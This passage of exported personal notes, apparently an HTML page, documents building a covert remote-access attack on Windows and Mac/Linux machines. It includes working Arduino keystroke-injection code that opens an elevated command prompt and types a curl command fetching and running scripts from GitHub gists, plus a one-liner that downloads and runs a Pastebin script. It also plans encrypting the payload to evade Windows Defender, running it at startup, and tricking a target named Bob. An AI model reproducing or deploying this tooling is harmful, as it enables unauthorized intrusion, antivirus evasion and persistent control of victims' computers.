+</p><p id="12a5fd6e-a8e0-410b-9f27-06c58242cebf" class="">Just an example of what we could do from here</p><ol type="1" id="35c10ca3-a95d-4166-a03e-06eca2d9efbd" class="numbered-list" start="1"><li>Start and stop programs</li></ol><ol type="1" id="888e5e6d-ce15-4a50-a3e0-05a1228cfee8" class="numbered-list" start="2"><li>Download files from the TARGET to our computer</li></ol><ol type="1" id="dee75311-7152-4f91-bad8-088a51802140" class="numbered-list" start="3"><li>Download files to the TARGET</li></ol><ol type="1" id="8f3b6092-1031-4681-94b6-0d3ba414f4ea" class="numbered-list" start="4"><li>Take screenshots</li></ol><ol type="1" id="11e6a419-bb8f-4e61-9117-c721414e2e77" class="numbered-list" start="5"><li>Play audio files on the computers speakers</li></ol><ol type="1" id="dda0ab62-0c94-46f6-8186-b3789284ee66" class="numbered-list" start="6"><li>Much much more</li></ol><h1 id="7703787b-31f0-4bad-926e-a76a9e26ca8a" class="">Running the payload on Windows</h1><figure class="block-color-yellow callout" style="white-space:pre-wrap;display:flex" id="0ffabd81-ff64-4e94-9c8b-98c20f89ca1c"><div style="font-size:1.5em"><span class="icon">🔬</span></div><div style="width:100%">Show how windows defender blocks it. Explain how it knows</div></figure><ul id="8fdbd7cb-b4d6-46f9-b478-1e961781a5b1" class="bulleted-list"><li style="list-style-type:disc">Explain what encryption is</li></ul><ul id="327438f5-b1eb-49e4-ad0b-16ed7c988417" class="bulleted-list"><li style="list-style-type:disc">Show how we are encrypting and decrypting the files</li></ul><p id="97b77f31-b3bf-4305-bad9-3c34216a0ca8" class="">
+</p><p id="2653a610-048b-4f8e-8330-81f22e432b18" class="">
+</p><p id="59f4d5ea-e92c-4cc4-b21a-4291e85bc2c2" class="">
+</p><p id="3ad43a11-26ee-41c0-afb9-c5f8dd1aea1b" class="">What is inside this </p><ol type="1" id="b96a4812-cd32-4c70-ae6a-f0323e9e6e2e" class="numbered-list" start="1"><li>Create the payload</li></ol><ol type="1" id="e1d8bef8-f43a-454c-9207-602dc8c152db" class="numbered-list" start="2"><li>Start the listener</li></ol><ol type="1" id="4742e44a-d876-4f27-915a-9dd36c4a44f9" class="numbered-list" start="3"><li>Run the payload on a target</li></ol><ol type="1" id="19a19724-9bc9-4586-b60a-f1ace8d9d387" class="numbered-list" start="4"><li>Windows detects Payload as a virus</li></ol><ol type="1" id="5eff95aa-f170-4d35-8c90-39f1f74b2599" class="numbered-list" start="5"><li>Encrypt the payload to avoid virus detection</li></ol><ol type="1" id="c56ed602-0e2e-4756-be91-6aa66b314126" class="numbered-list" start="6"><li>Keystroke injection on windows to automate payload download</li></ol><ol type="1" id="969389a6-2da3-44a1-bf43-60f24c4e0f56" class="numbered-list" start="7"><li>Keystroke injection on windows for admin</li></ol><ol type="1" id="280ce294-c276-4a54-bf66-12a0e8e5b481" class="numbered-list" start="8"><li>Schedule to run the payload on startup</li></ol><ol type="1" id="2322e68d-e43f-4971-9219-b870c592974b" class="numbered-list" start="9"><li>Check if python is installed, and if not install it</li></ol><ol type="1" id="a72f39b2-6e0c-4139-8450-a3a48230e980" class="numbered-list" start="10"><li></li></ol><p id="46e49144-5da9-4339-82b6-aef0e32f354f" class="">
+</p><p id="9faadf51-9199-41e7-acc5-c904bbd8e092" class="">
+</p><h1 id="ba76e70d-32da-4ac4-884a-2abb7b35f604" class="">What software layer this runs on</h1><p id="384f6a61-3d92-44f4-9864-00ae5e01ab65" class="">
+</p><p id="2533750b-160c-454d-9027-884b77b0e791" class="">The layer in which we run determines the level of control and percistance we have to the system. Let me illustrate this.</p><p id="815fa9c0-58f3-4cc2-b23f-3dffbf57da1d" class="">
+</p><p id="f82698c2-8913-4bea-8c91-95727ce67b33" class="">Bob is our target, more specifically his computer is. We tricked him using &quot;psychology&quot; to go to a certain website before he starts his day. Going to this website may allow us to run code on his browser, giving us control of it. The Browser is on the application layer. But our &quot;hack&quot; is on the computer user layer. </p><p id="bf58ee89-f792-4fa9-9c19-2412865208db" class="">
+</p><p id="73063b71-d3ca-48b9-9924-4faa49c94ea2" class="">What happens when he restarts the &quot;application&quot; (this would be his browser). Well we lose all control. We need to rely on him again to go to the same website so we can connect to and control his browser. </p><p id="2c13af39-2bfb-4c52-a6bf-bce6ccdedff6" class="">
+</p><p id="ffd9060e-2982-4192-acde-837370f147c6" class="">The lower you get in the system, the more control you have of the computer and it stays in that level.</p><p id="a97f0fce-e13e-4a4b-9ad5-c0c94fb15da4" class="">
+</p><p id="5b81e4f0-8db8-40e9-884a-00ee0ce7218f" class="">If you &quot;hack&quot; the browser by changing its files. Then even after restart you will still have access on the application layer. </p><p id="33631900-c328-4079-b011-468c7ab8ed21" class="">
+</p><p id="5e911356-d0e3-4d8e-a6c5-de44a6c4131b" class="">If we &quot;glue&quot; our hack to one layer. Like hypnotizing the user, or changing the files of an application. Then we can normally use that to gain access to one level lower. But it&#x27;s not persistent, meaning the application needs to run after the computer is restarted for the hack to work. Or if we hypnotized the user, in order for us to get access to the application, they must go to a certain website.</p><p id="014f74a9-6f01-426e-8426-c25465b8775b" class="">
+</p><p id="f116acce-5dfb-4b54-aa29-38afb09d7030" class="">The operating system runs the application. So if the application is modified, we are able to gain more control over the operating system.</p><p id="957e5970-237d-47a7-b0a8-16fff28dc1df" class="">
+</p><p id="386915b4-eb10-4ac8-8542-e281dd8bc40c" class="">The application runs what the user inputs, so if the user inputs something of ours. We can gain control over the browser.</p><p id="2a7d94cf-5f18-48b6-817b-1345a7513a0a" class="">
+</p><p id="12a16432-fffa-4cdb-9767-32a715d36837" class="">
+</p><figure id="79c475be-030a-482f-87ad-f4c716daae04" class="image"><a href="/assets/Gaining%20co%20b8870/Untitled%201.png"><img style="width:336px" src="/assets/Gaining%20co%20b8870/Untitled%201.png" /></a></figure><p id="e4025e3a-af0b-419e-b1b8-3e1e960a9382" class="">
+</p><p id="4feb85e4-39c7-4858-a884-f018efb59ddc" class="">
+</p><p id="cef835fe-3b32-4747-9e96-fc6fff376392" class="">
+</p><p id="001451e9-10e8-48fc-9f70-40723203a670" class="">I&#x27;m currently doing some &#x27;contracting&#x27; work for a cybersecurity company, but I wanted to break into some computers. I remembered Metasploit. A framework which lets me generate malicious payloads that when executed on a targets computer would essentially let me take control. However the EXE ones almost always got flagged by Windows security. This is because everything is in binary format. So Windows can identify viruses and trojans.</p><p id="4c099bb1-ec54-411e-aeb4-4ca49bc0b633" class="">
+</p><p id="c4239ba8-2fee-4a46-9a5e-22ce42b371bf" class="">
+</p><p id="5fffc0e4-d06d-413a-9131-446bbee0d344" class="">
+</p><p id="4d17005e-d587-4164-9bec-b7f6afd98390" class="">SCREEN RECORD WINDOWS SECURITY</p><p id="afd263cb-bd77-4d61-acfc-5f6e7425a93a" class="">
+</p><p id="27d5d34d-a25f-40e8-bd38-b1e8cf3a2570" class="">SCREEN RECORD THE PYTHON JUST WORKING</p><p id="80a22a3e-dd51-4a4b-bc84-e6a1723e10e5" class="">Then I found the python payloads. Simple payloads that can work on any device, they contact a server which then gains command line access(But still gets flagged on windows).</p><p id="62f6e05a-8a07-427f-8d98-bf3df959fd6b" class="">
+</p><p id="5242d812-cb3e-412f-936e-ae604ad7daa9" class="">
+</p><p id="6dbb7f6e-0b57-4c32-9ca6-d86203254ae4" class="">
+</p><p id="b2e21693-0147-455e-9354-14e27819922d" class="">
+</p><ul id="51587d93-59d3-4ec3-b08f-c004367e7a96" class="toggle"><li><details open=""><summary>Arduino Code</summary><pre id="50e99014-c2da-4e50-8765-02e09eb13d63" class="code"><code>#include &lt;Keyboard.h&gt;
+const int buttonPin = 9;     // the number of the pushbutton pin
+int buttonState = 0;         // variable for reading the pushbutton status
+const int osButtonPin = 10;     // the number of the pushbutton pin
+int osState = 0;         // variable for reading the pushbutton status
+void setup() {
+  // put your setup code here, to run once:
+    pinMode(buttonPin, INPUT);
+    pinMode(osButtonPin, INPUT);
+  Serial.begin(115200);
+ Keyboard.begin();  // Initialise the library.
+
+}
+
+void loop() {
+     buttonState = digitalRead(buttonPin);
+
+  // check if the pushbutton is pressed.
+  // if it is, the buttonState is HIGH:
+  if (buttonState == HIGH) {
+      // put your main code here, to run repeatedly:
+      Keyboard.press(KEY_LEFT_GUI);     // Press and hold the Windows key.
+      Keyboard.press(&#x27;r&#x27;);              // Press and hold the &#x27;r&#x27; key.
+      delay(100);                       // Wait for the computer to register the press.
+      Keyboard.releaseAll();            // Release both of the above keys.Notepado open.
+        // Press the Enter key.k
+              delay(100);                       // Wait for the computer to register the press.
+
+      Keyboard.print(&quot;cmd.exe&quot;);
+            delay(100);                       // Wait for the computer to register the press.
+
+     Keyboard.press(KEY_LEFT_CTRL);
+     Keyboard.press(KEY_LEFT_SHIFT);
+     Keyboard.press(KEY_RETURN);
+                 delay(200);  
+                 // Wait for the computer to register the press.
+
+       Keyboard.releaseAll();  
+                   delay(400); 
+                   // Wait for the computer to register the press.
+
+    Keyboard.press(KEY_LEFT_ARROW);
+                         delay(400);                       // Wait for the computer to register the press.
+
+           Keyboard.releaseAll(); 
+
+                     delay(100);                       // Wait for the computer to register the press.
+
+     Keyboard.press(KEY_RETURN);
+                 delay(100);                       // Wait for the computer to register the press.
+
+
+            
+                                    Keyboard.releaseAll(); 
+                                                     delay(200
+                                                     );                       // Wait for the computer to register the press.
+
+// Wait for the computer to register the press.
+
+
+
+
+      Keyboard.print(&quot;curl -s https://gist.githubusercontent.com/lennymelnik/41239f2cfb68673595835071b5cd8cd3/raw/88a437c5a5f1a37479f056594d39fe69802e158b/checkPython &gt; checkPython.bat &amp;&amp; curl -s https://gist.githubusercontent.com/lennymelnik/608ddc3fd7db791a6ad7930a3cbf9b85/raw/943f3b5f008e862f6c5e4978281e7bfe20e6cb1c/startEverything &gt; startEverything.vbs &amp;&amp; startEverything.vbs&quot;);
+                                  delay(2000);                       // Wait for the computer to register the press.
+
+        Keyboard.press(KEY_RETURN);
+                                                  delay(100);                       // Wait for the computer to register the press.
+
+             Keyboard.releaseAll(); 
+
+        
+
+
+                Keyboard.print(&quot;exit&quot;);
+                                          delay(100);                       // Wait for the computer to register the press.
+
+                Keyboard.press(KEY_RETURN);
+                                          delay(100);                       // Wait for the computer to register the press.
+             Keyboard.releaseAll(); 
+
+             
+
+
+
+
+
+  } else {
+    // turn LED off:
+  }  
+  
+  
+  
+                       // Wait for the computer to register the press.
+
+
+  
+
+}</code></pre></details></li></ul><ul id="94682867-2763-4a8e-83cc-c5fed80b5052" class="toggle"><li><details open=""><summary>Mac/Linux Command</summary><pre id="0be78648-ff9f-4a68-9255-852bb0d0121d" class="code"><code>pip install schedule pyaes &amp;&amp; curl -s https://pastebin.com/raw/Nbf5criN &gt; myProgram.py &amp;&amp; python myProgram.py</code></pre></details></li></ul><p id="81ebbcfa-d8b0-43b3-b60b-4f0aa5a7be53" class="">
+</p><h2 id="698f4740-1e6c-4bb5-a0a9-2b209eab8806" class="">Making it run on every startup</h2><p id="a2861d0a-1821-4ee6-a957-c28e24335561" class=""><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create</a></p><h1 id="3df91d14-78bc-4cb5-8189-12248faa53fa" class="">Issues</h1><hr id="2aeec9c7-fa44-49f0-8f9a-510b7322b164" /><h3 id="c3bd9c97-37f8-4de7-b851-9e32d17eae37" class="">Pastebin Deleted my Code</h3><figure id="6963810f-a6fd-491f-a921-f1f50495242c" class="image"><a href="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-13_at_3.11.07_PM.png"><img style="width:2848px" src="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-13_at_3.11.07_PM.png" /></a></figure><hr id="cc3c547d-245c-4e18-bbf1-1e8f40d5d801" /><h3 id="6b8afec9-161d-4897-8852-c7074cd2850e" class="">Windows scheduler errors</h3><p id="9189de72-ff1e-4b38-81d6-f969ace57bf8" class="">This one took me a while</p><p id="fec345f3-c751-4dad-95af-d3291cab7dfb" class="">If the permissions are not set right, then it wont work</p><figure id="70beeaf5-2229-43a7-ab1f-6d7de4e9789d" class="image"><a href="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-13_at_3.14.13_PM.png"><img style="width:1598px" src="/assets/Gaining%20co%20b8870/Screen_Shot_2021-10-13_at_3.14.13_PM.png" /></a></figure><p id="7bb320b3-132a-4ce0-9f96-6d1baee78b09" class="">
+</p><p id="0548fdd7-128b-4dcd-b240-5ef46c84c174" class="">Basically in the end I had to specify a relative path. So where do we run the command from, and then the command. EXEPT FOR ONE ISSUE. In the CMD version (something we can do) there is no option to set relative path. So I had to go full brain mode, and put the code in the system32 folder, so that the &quot;relative path&quot; is the default one</p></div></article></body></html>
